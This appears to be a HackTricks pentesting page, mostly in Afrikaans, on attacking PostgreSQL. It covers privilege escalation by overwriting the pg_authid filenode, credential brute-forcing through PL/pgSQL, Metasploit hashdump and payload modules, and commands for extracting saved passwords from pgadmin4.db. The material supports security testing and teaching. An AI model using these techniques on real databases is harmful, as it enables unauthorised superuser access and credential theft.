**PL/pgSQL** is 'n **volledig funksionele programmeertaal** wat groter prosedurele beheer bied in vergelyking met SQL. Dit maak die gebruik van **lusse** en ander **kontrolestrukture** moontlik om programlogika te verbeter. Daarbenewens kan **SQL statements** en **triggers** funksies aanroep wat geskep is met die **PL/pgSQL language**. Hierdie integrasie maak 'n meer omvattende en veelsydige benadering tot databasisprogrammering en outomatisering moontlik.\
**Jy kan hierdie taal misbruik om PostgreSQL te vra om die gebruikers se aanmeldbewyse te brute-force.**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md
{{#endref}}

### Privesc by Overwriting Internal PostgreSQL Tables

> [!TIP]
> Die volgende privesc-vektor is veral nuttig in beperkte SQLi-kontekste, aangesien alle stappe deur geneste SELECT statements uitgevoer kan word

As jy die PostgreSQL-bedienerlêers kan **lees en skryf**, kan jy **'n superuser word** deur die PostgreSQL on-disk filenode wat geassosieer is met die interne `pg_authid` tabel oor te skryf.

Read more about **hierdie tegniek** [**here**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

The attack steps are:

1. Kry die PostgreSQL data directory
2. Kry 'n relatiewe pad na die filenode wat geassosieer is met die `pg_authid` tabel
3. Laai die filenode af deur die `lo_*` functions
4. Kry die datatype wat geassosieer word met die `pg_authid` tabel
5. Gebruik die [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) to [edit the filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg_authid-table); stel alle `rol*` boolean-vlae op 1 vir volle toestemmings.
6. Laai die gewysigde filenode weer op via die `lo_*` functions, en oorskryf die oorspronklike lêer op die skyf
7. _(Optionally)_ Maak die in-memory tabelkas skoon deur 'n duur SQL query uit te voer
8. Jy behoort nou die voorregte van 'n volledige superadmin te hê.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### logging

Binne die _**postgresql.conf**_ lêer kan jy postgresql logs aktiveer deur die volgende te verander:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Dan, **herbegin die diens**.

### pgadmin

[pgadmin](https://www.pgadmin.org) is 'n administrasie- en ontwikkelingsplatform vir PostgreSQL.\
Jy kan **passwords** vind binne die _**pgadmin4.db**_ lêer\
Jy kan dit ontsleutel deur die _**decrypt**_ funksie in die skrip te gebruik: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg_hba

Kliëntverifikasie in PostgreSQL word bestuur deur 'n konfigurasielêer genaamd **pg_hba.conf**. Hierdie lêer bevat 'n reeks rekords, elk wat 'n koppeltipe, kliënt IP-adresreeks (indien van toepassing), databasisnaam, gebruikersnaam, en die verifikasie-metode spesifiseer wat gebruik word om verbindings te laat ooreenstem. Die eerste rekord wat ooreenstem met die koppeltipe, kliëntadres, versoekte databasis, en gebruikersnaam word vir verifikasie gebruik. Daar is geen terugval of rugsteun as verifikasie misluk nie. Indien geen rekord ooreenstem nie, word toegang geweier.

Die beskikbare wagwoord-gebaseerde verifikasiemetodes in **pg_hba.conf** is **md5**, **crypt**, en **password**. Hierdie metodes verskil in hoe die wagwoord oorgedra word: MD5-gehasj, crypt-versleuteld, of in klare teks. Dit is belangrik om op te let dat die crypt-metode nie gebruik kan word met wagwoorde wat in pg_authid versleutel is nie.

## Verwysings

- [HTB: DarkCorp by 0xdf](https://0xdf.gitlab.io/2025/10/18/htb-darkcorp.html)
- [PayloadsAllTheThings: PostgreSQL Injection - Using COPY TO/FROM PROGRAM](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#using-copy-tofrom-program)
- [Postgres SQL injection to RCE with archive_command (The Gray Area)](https://thegrayarea.tech/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)

{{#include ../banners/hacktricks-training.md}}
